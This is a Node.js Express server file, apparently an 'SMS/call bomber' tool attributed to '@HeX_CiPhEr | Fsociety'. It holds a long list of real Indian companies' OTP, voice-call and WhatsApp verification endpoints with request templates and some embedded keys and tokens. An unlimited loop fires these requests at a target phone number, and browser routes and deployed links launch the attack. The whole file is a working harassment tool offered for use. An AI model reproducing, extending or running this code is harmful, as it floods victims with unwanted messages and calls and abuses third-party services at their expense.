// API Bomber - Direct Browser Attack
// @HeX_CiPhEr | Fsociety

const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());

// ==================== CONFIG ====================
const RATE_LIMIT_SECONDS = 10;
const userLastRequest = {};

// ==================== 150+ APIS ====================
const APIS = [
  { name: "Tata Capital", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","isOtpViaCallAtLogin":"true"}` },
  { name: "1MG", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"number":"${phone}","otp_on_call":true}` },
  { name: "Swiggy", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Myntra", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Flipkart", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Amazon", url: "https://www.amazon.in/ap/signin", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `phone=${phone}&action=voice_otp` },
  { name: "Paytm", url: "https://accounts.paytm.com/signin/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Zomato", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `phone=${phone}&type=voice` },
  { name: "MakeMyTrip", url: "https://www.makemytrip.com/api/4/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Goibibo", url: "https://www.goibibo.com/user/voice-otp/generate/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Ola", url: "https://api.olacabs.com/v1/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Uber", url: "https://auth.uber.com/v2/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "KPN WhatsApp", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", method: "POST", headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f" }, data: (phone) => `{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"${phone}"}}` },
  { name: "Foxy WhatsApp", url: "https://www.foxy.in/api/v2/users/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"user":{"phone_number":"+91${phone}"},"via":"whatsapp"}` },
  { name: "Lenskart", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phoneCode":"+91","telephone":"${phone}"}` },
  { name: "NoBroker", url: "https://www.nobroker.in/api/v3/account/otp/send", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `phone=${phone}&countryCode=IN` },
  { name: "PharmEasy", url: "https://pharmeasy.in/api/v2/auth/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Wakefit", url: "https://api.wakefit.co/api/consumer-sms-otp/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Byjus", url: "https://api.byjus.com/v2/otp/send", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Hungama", url: "https://communication.api.hungama.com/v1/communication/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobileNo":"${phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}` },
  { name: "Meru Cab", url: "https://merucabapp.com/api/otp/generate", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `mobile_number=${phone}` },
  { name: "Doubtnut", url: "https://api.doubtnut.com/v4/student/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone_number":"${phone}","language":"en"}` },
  { name: "Snapmint", url: "https://api.snapmint.com/v1/public/sign_up", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Housing.com", url: "https://login.housing.com/api/v2/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","country_url_name":"in"}` },
  { name: "RentoMojo", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Khatabook", url: "https://api.khatabook.com/v1/auth/request-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","app_signature":"wk+avHrHZf2"}` },
  { name: "Netmeds", url: "https://apiv2.netmeds.com/mst/rest/v1/id/details/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Nykaa", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `source=sms&app_version=3.0.9&mobile_number=${phone}&platform=ANDROID&domain=nykaa` },
  { name: "RummyCircle", url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","isPlaycircle":false}` },
  { name: "Animall", url: "https://animall.in/zap/auth/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","signupPlatform":"NATIVE_ANDROID"}` },
  { name: "Cosmofeed", url: "https://prod.api.cosmofeed.com/api/user/authenticate", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","version":"1.4.28"}` },
  { name: "Aakash", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile_number":"${phone}","activity_type":"aakash-myadmission"}` },
  { name: "TrulyMadly", url: "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","locale":"IN"}` },
  { name: "Apna", url: "https://production.apna.co/api/userprofile/v1/otp/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","hash_type":"play_store"}` },
  { name: "Swipe", url: "https://app.getswipe.in/api/user/mobile_login", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","resend":true}` },
  { name: "Country Delight", url: "https://api.countrydelight.in/api/v1/customer/requestOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","platform":"Android","mode":"new_user"}` },
  { name: "Rapido", url: "https://customer.rapido.bike/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "BetterHalf", url: "https://api.betterhalf.ai/v2/auth/otp/send/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","isd_code":"91"}` },
  { name: "Charzer", url: "https://api.charzer.com/auth-service/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","appSource":"CHARZER_APP"}` },
  { name: "Mpokket", url: "https://web-api.mpokket.in/registration/sendOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "splexxo_bomb", url: "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", method: "GET", headers: {}, data: null },
  { name: "agrevolution_otp", url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile_number":"${phone}","client_id":"kisan-app"}` },
  { name: "breeze_session", url: "https://api.breeze.in/session/start", method: "POST", headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" }, data: (phone) => `{"phoneNumber":"${phone}","authVerificationType":"otp","device":{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"},"countryCode":"+91"}` },
  { name: "jockey_whatsapp", url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true", method: "GET", headers: { "accept": "*/*", "user-agent": "Mozilla/5.0", "origin": "https://www.jockey.in", "referer": "https://www.jockey.in/" }, data: null },
  { name: "kpn_fresh", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", method: "POST", headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8" }, data: (phone) => `{"phone_number":{"country_code":"+91","number":"${phone}"}}` },
  { name: "aditya_birla", url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `MobileNumber=${phone}&functionality=signup` },
  { name: "muthoot_finance", url: "https://www.muthootfinance.com/smsapi.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `mobile=${phone}&pin=XjtYYEdhP0haXjo3` },
  { name: "gopaysense", url: "https://api.gopaysense.com/users/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "iifl", url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `apply_for=18&full_name=Adnvs+Signh&mobile_number=${phone}&terms_and_condition=1&_drupal_ajax=1` },
  { name: "bankopen", url: "https://v2-api.bankopen.co/users/register/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"username":"${phone}","is_open_capital":1}` },
  { name: "tata_capital_retail", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"header":{"authToken":"MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==","identifier":"nli"},"body":{"mobileNumber":"${phone}"}}` },
  { name: "tradeindia", url: "https://apis.tradeindia.com/app_login_api/login_app", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"+91${phone}"}` },
  { name: "khatabook_app", url: "https://api.khatabook.com/v1/auth/request-otp", method: "POST", headers: { "x-kb-app-name": "khatabook", "Content-Type": "application/json; charset=UTF-8" }, data: (phone) => `{"phone":"${phone}","country_code":"+91","app_signature":"wk+avHrHZf2"}` },
  { name: "orange_health", url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile_number":"${phone}","customer_auto_fetch_message":true}` },
  { name: "jobhai", url: "https://api.jobhai.com/auth/jobseeker/v3/send_otp", method: "POST", headers: { "Content-Type": "application/json;charset=UTF-8" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "mconnect", url: "https://mconnect.isteer.co/mconnect/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile_number":"+91${phone}"}` },
  { name: "astrosage_varta", url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0", method: "GET", headers: {}, data: null },
  { name: "spinny", url: "https://api.spinny.com/api/c/user/otp-request/v3/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"contact_number":"${phone}","whatsapp":false,"code_len":4,"expected_action":"login"}` },
  { name: "dream11", url: "https://www.dream11.com/auth/passwordless/init", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"channel":"sms","flow":"SIGNUP","phoneNumber":"${phone}","templateName":"default"}` },
  { name: "citymall", url: "https://citymall.live/api/cl-user/auth/get-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone_number":"${phone}"}` },
  { name: "codfirm", url: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com", method: "GET", headers: {}, data: null },
  { name: "oyo", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en", method: "POST", headers: { "Content-Type": "text/plain;charset=UTF-8" }, data: (phone) => `{"phone":"${phone}","country_code":"+91","nod":4}` },
  { name: "myma", url: "https://portal.myma.in/custom-api/auth/generateotp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"countrycode":"+91","mobile":"91${phone}","is_otpgenerated":false,"app_version":"-1"}` },
  { name: "freedo_rentals", url: "https://api.freedo.rentals/customer/sendOtpForSignUp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"email_id":"cokiwav528@avastu.com","first_name":"Haiii","mobile_number":"${phone}"}` },
  { name: "licious", url: "https://www.licious.in/api/login/signup", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","captcha_token":null}` },
  { name: "bisleri", url: "https://apis.bisleri.com/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"email":"abfhhfhcd@gmail.com","mobile":"${phone}"}` },
  { name: "evital", url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"pharmacy_name":"hfhfjfgfhkf","mobile":"${phone}","referral_code":"","email_id":"jhvd@gmail.com","zip_code":"110086","device_id":"f2cea99f-381d-432d-bd27-02bc6678fa93","app_version":"desktop","device_name":"Chrome"}` },
  { name: "quickride", url: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", method: "POST", headers: { "APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `contactNo=${phone}&countryCode=%2B91&appName=Quick%20Ride` },
  { name: "clovia", url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true", method: "GET", headers: {}, data: null },
  { name: "kwikfix", url: "https://admin.kwikfixauto.in/api/auth/signupotp/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "brevistay", url: "https://www.brevistay.com/cst/app-api/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"is_otp":1,"is_password":0,"mobile":"${phone}"}` },
  { name: "hourlyrooms", url: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "madrasmandi", url: "https://api.madrasmandi.in/api/v1/auth/otp", method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ" }, data: (phone) => `------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91${phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n` },
  { name: "bharatloan", url: "https://www.bharatloan.com/login-sbm", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `mobile=${phone}&current_page=login&is_existing_customer=2` },
  { name: "pagarbook", url: "https://api.pagarbook.com/api/v5/auth/otp/request", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","language":1}` },
  { name: "vahak", url: "https://api.vahak.in/v1/u/o_w", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone_number":"${phone}","scope":0,"is_whatsapp":false}` },
  { name: "redcliffelabs", url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone_number":"${phone}","short":true}` },
  { name: "ixigo", url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", method: "POST", headers: { "apikey": "ixiweb\u00212$", "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone=${phone}` },
  { name: "55club", url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode", method: "POST", headers: { "Content-Type": "application/json;charset=UTF-8" }, data: (phone) => `{"phone":"91${phone}","codeType":1,"language":0}` },
  { name: "zerodha", url: "https://zerodha.com/account/registration.php", method: "POST", headers: { "Content-Type": "application/json;charset=UTF-8" }, data: (phone) => `{"mobile":"${phone}","source":"zerodha","partner_id":""}` },
  { name: "testbook", url: "https://api.testbook.com/api/v2/mobile/signup", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","signupDetails":{"page":"HomePage"}}` },
  { name: "medibuddy", url: "https://loginprod.medibuddy.in/unified-login/user/register", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"${phone}","flow":"Retail-Login-Home-Flow"}` },
  { name: "tradeindia_reg", url: "https://api.tradeindia.com/home/registration/", method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX" }, data: (phone) => `------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n${phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="name"\r\n\r\natyug\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="email"\r\n\r\ndrhufj@gmail.com\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n` },
  { name: "beyoung", url: "https://www.beyoung.in/api/sendOtp.json", method: "POST", headers: { "Content-Type": "application/json;charset=UTF-8" }, data: (phone) => `{"username":"${phone}","username_type":"mobile","service_type":0}` },
  { name: "wrogn", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST", headers: { "action": "sendOTP", "Content-Type": "application/json" }, data: (phone) => `{"username":"+91${phone}","type":"mobile","domain":"wrogn.com"}` },
  { name: "medkart", url: "https://app.medkart.in/api/v1/auth/requestOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile_no":"${phone}"}` },
  { name: "coverfox", url: "https://www.coverfox.com/otp/send/", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact=${phone}` },
  { name: "woodenstreet", url: "https://www.woodenstreet.com/index.php?route=account/forgotten_popup", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `token=&firstname=Aartd&telephone=${phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&login=2&userput_otp=` },
  { name: "gomechanic", url: "https://gomechanic.app/api/v2/send_otp", method: "POST", headers: { "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27", "Content-Type": "application/json" }, data: (phone) => `{"number":"${phone}","source":"website","random_id":"K6z9b"}` },
  { name: "lovelocal", url: "https://homedeliverybackend.mpaani.com/auth/send-otp", method: "POST", headers: { "client-code": "vulpix", "Content-Type": "application/json" }, data: (phone) => `{"phone_number":"${phone}","role":"CUSTOMER"}` },
  { name: "tyreplex", url: "https://www.tyreplex.com/includes/ajax/gfend.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `perform_action=sendOTP&mobile_no=${phone}&action_type=order_login` },
  { name: "udaan", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" }, data: (phone) => `mobile=${phone}` },
  { name: "xylem", url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}","countryCode":"+91","firstName":"Anant Ambani"}` },
  { name: "nobroker_v1", url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `phone=%2B91${phone}` },
  { name: "vidyakul", url: "https://vidyakul.com/signup-otp/send", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }, data: (phone) => `phone=${phone}` },
  { name: "woodenstreet_register", url: "https://api.woodenstreet.com/api/v1/register", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"firstname":"Astres","email":"abcdhbdgud77dd@gmail.com","telephone":"${phone}","password":"abcd@gmail.com#%fd","isGuest":0,"pincode":"110001"}` },
  { name: "penpencil_pw", url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.pw.live" }, data: (phone) => `{"mobile":"${phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}` },
  { name: "zoho_store", url: "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91${phone}&countrycode=IN&country=india", method: "POST", headers: { "Accept": "*/*", "Content-Length": "0", "Origin": "https://www.zoho.com" }, data: null },
  { name: "Tata Capital Voice Call", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}","isOtpViaCallAtLogin":"true"}` },
  { name: "1MG Voice Call", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: { "Content-Type": "application/json; charset=utf-8" }, data: (phone) => `{"number":"${phone}","otp_on_call":true}` },
  { name: "Swiggy Call Verification", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: { "Content-Type": "application/json; charset=utf-8" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Myntra Voice Call", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Flipkart Voice Call", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"mobile":"${phone}"}` },
  { name: "Amazon Voice Call", url: "https://www.amazon.in/ap/signin", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `phone=${phone}&action=voice_otp` },
  { name: "Paytm Voice Call", url: "https://accounts.paytm.com/signin/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Zomato Voice Call", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => `phone=${phone}&type=voice` },
  { name: "MakeMyTrip Voice Call", url: "https://www.makemytrip.com/api/4/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Goibibo Voice Call", url: "https://www.goibibo.com/user/voice-otp/generate/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Ola Voice Call", url: "https://api.olacabs.com/v1/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "Uber Voice Call", url: "https://auth.uber.com/v2/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"phone":"${phone}"}` },
  { name: "KPN WhatsApp", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", method: "POST", headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" }, data: (phone) => `{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"${phone}"}}` },
  { name: "Foxy WhatsApp", url: "https://www.foxy.in/api/v2/users/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => `{"user":{"phone_number":"+91${phone}"},"via":"whatsapp"}` },
];

// ==================== HELPERS ====================
function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function getFormats(phone) { return [phone, "91" + phone, "+91" + phone]; }

// ==================== ATTACK WORKER ====================
async function sendRequest(api, phone) {
  try {
    let url = api.url;
    if (typeof url === 'string' && url.includes('{phone}')) {
      url = url.replace(/\{phone\}/g, phone);
    }
    const headers = { ...api.headers };
    let data = null;
    if (api.data && typeof api.data === 'function') {
      data = api.data(phone);
    }
    const config = { method: api.method || 'GET', url, headers, timeout: 3000 };
    if (data) config.data = data;
    const response = await axios(config);
    return { status: response.status, name: api.name };
  } catch (error) {
    return { status: error.response?.status || null, name: api.name };
  }
}

// ==================== MAIN BOMBER (Unlimited) ====================
async function runBomber(phone, duration = 0) {
  const startTime = Date.now();
  let smsCount = 0, callCount = 0, whatsappCount = 0, totalSent = 0;
  const formats = getFormats(phone);
  
  // Run until user stops (duration 0 = unlimited)
  while (true) {
    // If duration is set and time is up, stop
    if (duration > 0 && (Date.now() - startTime) >= duration * 1000) {
      break;
    }
    const api = randomItem(APIS);
    const result = await sendRequest(api, randomItem(formats));
    if (result.status && [200, 201, 202, 204].includes(result.status)) {
      totalSent++;
      const name = result.name.toLowerCase();
      if (name.includes('call') || name.includes('voice')) callCount++;
      else if (name.includes('whatsapp')) whatsappCount++;
      else smsCount++;
    }
    await new Promise(r => setTimeout(r, 50));
  }
  return { smsCount, callCount, whatsappCount, totalSent };
}

// ==================== ROUTES ====================

// Health Check
app.get('/', (req, res) => {
  res.json({ 
    status: 'online', 
    name: 'API Bomber', 
    apis: APIS.length, 
    author: '@HeX_CiPhEr',
    note: 'Use /start/:phone to attack'
  });
});

// START ATTACK - Direct Browser (UNLIMITED)
app.get('/start/:phone', async (req, res) => {
  const phone = req.params.phone;
  if (!phone || !phone.match(/^\d{10}$/)) {
    return res.json({ error: 'Invalid phone number. Need 10 digits.' });
  }
  
  // Rate limit check
  const now = Date.now();
  if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
    return res.json({ 
      error: `Rate limited. Wait ${RATE_LIMIT_SECONDS}s`,
      wait: RATE_LIMIT_SECONDS,
      phone: phone
    });
  }
  userLastRequest[phone] = now;
  
  // Start attack (duration 0 = unlimited)
  try {
    const results = await runBomber(phone, 0);
    res.json({
      success: true,
      target: phone,
      duration: 'Unlimited',
      stats: results,
      note: 'Attack running. Refresh page to stop.'
    });
  } catch (error) {
    res.json({ success: false, error: 'Attack failed' });
  }
});

// START ATTACK with Duration
app.get('/start/:phone/:duration', async (req, res) => {
  const phone = req.params.phone;
  const duration = parseInt(req.params.duration) || 60;
  if (!phone || !phone.match(/^\d{10}$/)) {
    return res.json({ error: 'Invalid phone number. Need 10 digits.' });
  }
  
  const now = Date.now();
  if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
    return res.json({ 
      error: `Rate limited. Wait ${RATE_LIMIT_SECONDS}s`,
      wait: RATE_LIMIT_SECONDS,
      phone: phone
    });
  }
  userLastRequest[phone] = now;
  
  try {
    const results = await runBomber(phone, duration);
    res.json({
      success: true,
      target: phone,
      duration: duration + 's',
      stats: results
    });
  } catch (error) {
    res.json({ success: false, error: 'Attack failed' });
  }
});

// Status endpoint
app.get('/status/:phone', (req, res) => {
  const phone = req.params.phone;
  if (!phone || !phone.match(/^\d{10}$/)) {
    return res.json({ error: 'Invalid phone number. Need 10 digits.' });
  }
  res.json({
    status: 'ready',
    target: phone,
    attack_link: `https://bomber-hex-osint.vercel.app/start/${phone}`,
    duration_link: `https://bomber-hex-osint.vercel.app/start/${phone}/60`,
    note: 'Open link in browser to start attack'
  });
});

// Stop attack (by clearing rate limit)
app.get('/stop/:phone', (req, res) => {
  const phone = req.params.phone;
  if (userLastRequest[phone]) {
    delete userLastRequest[phone];
    res.json({ success: true, message: `Attack stopped for ${phone}` });
  } else {
    res.json({ success: false, message: 'No active attack for this number' });
  }
});

module.exports = app;